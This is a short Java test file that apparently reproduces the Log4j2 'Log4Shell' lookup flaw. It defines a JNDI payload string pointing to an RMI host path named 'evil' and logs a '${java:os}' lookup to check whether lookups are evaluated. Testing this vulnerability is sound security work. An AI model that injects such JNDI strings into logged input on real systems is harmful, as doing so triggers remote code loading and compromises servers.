package com.yy;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @className: log4j2
 * @description:
 * @author: yloopdaed
 * @date: 2021/12/10
 **/
public class log4j2 {
    private static final Logger LOGGER = LogManager.getLogger(log4j2.class);

    public static void main(String[] args) {
        String str = "${jndi:rmi://127.0.0.1:1099/evil}";
        String ss = "${java:os}";
        LOGGER.info("test: {}", ss);
    }
}
